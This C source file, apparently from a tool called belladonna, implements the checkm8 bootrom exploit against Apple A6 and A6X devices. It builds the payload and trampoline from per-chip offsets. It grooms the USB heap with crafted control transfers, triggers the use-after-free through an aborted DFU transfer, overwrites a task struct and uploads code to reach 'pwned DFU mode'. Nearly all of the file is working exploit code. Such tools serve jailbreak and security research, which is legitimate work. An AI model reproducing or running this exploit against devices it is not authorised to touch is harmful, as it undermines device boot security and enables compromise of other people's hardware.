#include "checkm8.h"
#include "checkm8_offsets.h"

#include "payload/checkm8_exploit_payload.h"
#include "payload/checkm8_handler_payload.h"

#include <string.h>
#include <stddef.h>
#include <unistd.h>

#include <libirecovery.h>

/* Functions for building the checkm8 payload and finding the correct config */

static void thumb_trampoline(uint32_t src, uint32_t dest, uint32_t* trampoline) {
	if(src % 2 != 1 || dest % 2 != 1) {
		return;
	}
	if(src % 4 == 1) {
		trampoline[0] = 0xF000F8DF;
		trampoline[1] = dest;
	}
	else {
		trampoline[0] = 0xF002F8DF;
		trampoline[1] = dest;
	}
}

static int generate_checkm8_payload(belladonna_ctx_t ctx, checkm8_payload_t* payload) {
	memset(payload, '\0', sizeof(checkm8_payload_t));

	/* Sanity checks */
	if(checkm8_exploit_payload_length > PAYLOAD_OFFSET_ARMV7) {
		ctx->error_log("checkm8 exploit too large\n");
		return -1;
	}
	if( (checkm8_handler_payload_length - TRAMPOLINE_SIZE_ARMV7) > PAYLOAD_SIZE_ARMV7) {
		ctx->error_log("checkm8 handler too large\n");
		return -1;
	}

	/* Copy the exploit payload and handler into the correct position */
	memcpy(payload->checkm8_exploit, checkm8_exploit_payload, checkm8_exploit_payload_length);

	/* Remove the 4 bkpt instructions (we use these so that when we jump to jump_back from our handler, we execute the trampoline */
	memcpy(payload->checkm8_handler, &checkm8_handler_payload[TRAMPOLINE_SIZE_ARMV7], (checkm8_handler_payload_length - TRAMPOLINE_SIZE_ARMV7));


	/* The offsets are to be placed at the very end of the checkm8 exploit and handler */
	char* checkm8_exploit_offsets_loc = &payload->checkm8_exploit[checkm8_exploit_payload_length];
	char* checkm8_handler_offsets_loc = &payload->checkm8_handler[checkm8_handler_payload_length - TRAMPOLINE_SIZE_ARMV7];

	/* Move to the start location of the offsets so we can just copy the offsets to the right location */
	checkm8_exploit_offsets_loc -= sizeof(checkm8_exploit_offsets_t);
	checkm8_handler_offsets_loc -= sizeof(checkm8_handler_offsets_t);
	
	char trampoline[TRAMPOLINE_SIZE_ARMV7];

	switch(ctx->dev_info->chip_id) {
		case 0x8950:
			memcpy(checkm8_exploit_offsets_loc, &s5l8950x_exploit_offsets, sizeof(s5l8950x_exploit_offsets));
			memcpy(checkm8_handler_offsets_loc, &s5l8950x_handler_offsets, sizeof(s5l8950x_handler_offsets));

			/* Finally put in the trampoline */
			thumb_trampoline(0x10079800+1, 0x8160+1, (uint32_t*)trampoline);
			memcpy(payload->trampoline, trampoline, TRAMPOLINE_SIZE_ARMV7);
			return 0;
		case 0x8955:
			memcpy(checkm8_exploit_offsets_loc, &s5l8955x_exploit_offsets, sizeof(s5l8955x_exploit_offsets));
			memcpy(checkm8_handler_offsets_loc, &s5l8955x_handler_offsets, sizeof(s5l8955x_handler_offsets));

			/* Finally put in the trampoline */
			thumb_trampoline(0x10079800+1, 0x81A0+1, (uint32_t*)trampoline);
			memcpy(payload->trampoline, trampoline, TRAMPOLINE_SIZE_ARMV7);
			return 0;
		default:
			ctx->error_log("checkm8 offsets don't exist for your device\n");
			return -1;
	}

}

static int get_checkm8_config(belladonna_ctx_t ctx, checkm8_config_t* config) {
	switch(ctx->dev_info->chip_id) {
		case 0x8950:
			memcpy(config, &s5l8950x_config, sizeof(checkm8_config_t));
			return 0;
		case 0x8955:
			memcpy(config, &s5l8955x_config, sizeof(checkm8_config_t));
			return 0;
		default:
			ctx->error_log("A checkm8 configuration doesn't exist for your device\n");
			return -1;
	}
}

/* Helpers for the checkm8 exploit */

static int usb_req_stall(belladonna_ctx_t ctx) {
	return irecv_usb_control_transfer(ctx->client, 0x2, 3, 0x0, 0x80, NULL, 0, 10);
}
static int usb_req_leak(belladonna_ctx_t ctx) {
	unsigned char buf[0x40] = {'0'};
	return irecv_usb_control_transfer(ctx->client, 0x80, 6, 0x304, 0x40A, buf, 0x40, 1);
}
static int usb_req_no_leak(belladonna_ctx_t ctx) {
	unsigned char buf[0x41] = {'0'};
	return irecv_usb_control_transfer(ctx->client, 0x80, 6, 0x304, 0x40A, buf, 0x41, 1);
}

/* The functions we use to interact with the exploit */

int checkm8_supported(belladonna_ctx_t ctx) {

	/* Only A6 and A6X devices supported for now */
	switch(ctx->dev_info->chip_id) {
		case 0x8950:
			return 0;
		case 0x8955:
			return 0;
		default:
			return -1;
	}
}

int checkm8_exploit(belladonna_ctx_t ctx) {
	unsigned char buf[0x800] = { 'A' };
	int ret = 0;

	checkm8_config_t config;
	checkm8_payload_t payload;

	ctx->progress_log(0);

	ret = generate_checkm8_payload(ctx, &payload);
	if(ret < 0) {
		return -1;
	}

	ret = get_checkm8_config(ctx, &config);
	if(ret != 0) {
		return -1;
	}

	ctx->debug_log("Grooming heap\n");
	ret = usb_req_stall(ctx);
	if(ret != IRECV_E_PIPE) {
		ctx->error_log("Failed to stall pipe.\n");
		return -1;
	}
	usleep(100);
	for(int i = 0; i < config.large_leak; i += 1) {
		ret = usb_req_leak(ctx);
		if(ret != IRECV_E_TIMEOUT) {
			ctx->error_log("Failed to create heap hole, i = %d\n", i);
			return -1;
		}
	}
	usleep(100);
	ret = usb_req_no_leak(ctx);
	if(ret != IRECV_E_TIMEOUT) {
		ctx->error_log("Failed to create heap hole.\n");
		return -1;
	}
	irecv_reset(ctx->client);
	ret = belladonna_reconnect(ctx, 0);
	if(ret != 0) {
		ctx->error_log("Failed to reconnect to device.\n");
		return -1;
	}

	ctx->progress_log(17);
	ctx->debug_log("Preparing for overwrite\n");

	int sent = irecv_async_usb_control_transfer_with_cancel(ctx->client, 0x21, 1, 0, 0, buf, 0x800, 5 * 900);
	if(sent < 0) {
		ctx->error_log("Failed to send bug setup.\n");
		irecv_close(ctx->client);
		return -1;
	}
	if(sent > config.overwrite_offset) {
		ctx->error_log("Failed to abort bug setup.\n");
		irecv_close(ctx->client);
		return -1;
	}
	usleep(100);
	ret = irecv_usb_control_transfer(ctx->client, 0, 0, 0, 0, buf, config.overwrite_offset - sent, 5);
	if(ret != IRECV_E_PIPE) {
		ctx->error_log("Failed to push forward overwrite offset.\n");
		return -1;
	}
	usleep(100);
	ret = irecv_usb_control_transfer(ctx->client, 0x21, 4, 0, 0, NULL, 0, 0);
	if(ret != 0) {
		ctx->error_log("Failed to send abort.\n");
		return -1;
	}
	ret = belladonna_reconnect(ctx, 1);
	if(ret != 0) {
		ctx->error_log("Failed to reconnect to device.\n");
		return -1;
	}
	ctx->progress_log(33);
	ctx->debug_log("Grooming heap\n");
	ret = usb_req_stall(ctx);
	if(ret != IRECV_E_PIPE) {
		ctx->error_log("Failed to stall pipe.\n");
		return -1;
	}
	usleep(100);
	ret = usb_req_leak(ctx);
	if(ret != IRECV_E_TIMEOUT) {
		ctx->error_log("Failed to create heap hole.\n");
		return -1;
	}
	ctx->progress_log(50);
	ctx->debug_log("Overwriting task struct\n");

	ret = irecv_usb_control_transfer(ctx->client, 0, 0, 0, 0, config.overwrite, config.overwrite_len, 100);
	if(ret != IRECV_E_PIPE) {
		ctx->error_log("Failed to overwrite task.");
		return -1;
	}
	ctx->progress_log(66);
	ctx->debug_log("Uploading payload\n");

	/* The payload will never be > than 0x800 in size so we don't bother with a proper sending loop */
	ret = irecv_usb_control_transfer(ctx->client, 0x21, 1, 0, 0, (unsigned char*)&payload, sizeof(checkm8_payload_t), 100);
	if(ret != IRECV_E_TIMEOUT) {
		ctx->error_log("Failed to upload payload.\n");
		return -1;
	}
	ctx->progress_log(83);
	ctx->debug_log("Executing payload\n");
	
	irecv_reset(ctx->client);
	ret = belladonna_reconnect(ctx, 0);
	if(ret != 0) {
		ctx->error_log("Failed to reconnect to device.\n");
		return -1;
	}

	 if(ctx->loaded_img != RECOVERY_IMG_PWND_DFU) {
	 	ctx->debug_log("Failed to enter pwned DFU mode\n");
	 	return -1;
	 }

	ctx->debug_log("Device is now in pwned DFU mode\n");
	ctx->progress_log(100);
	return 0;
}
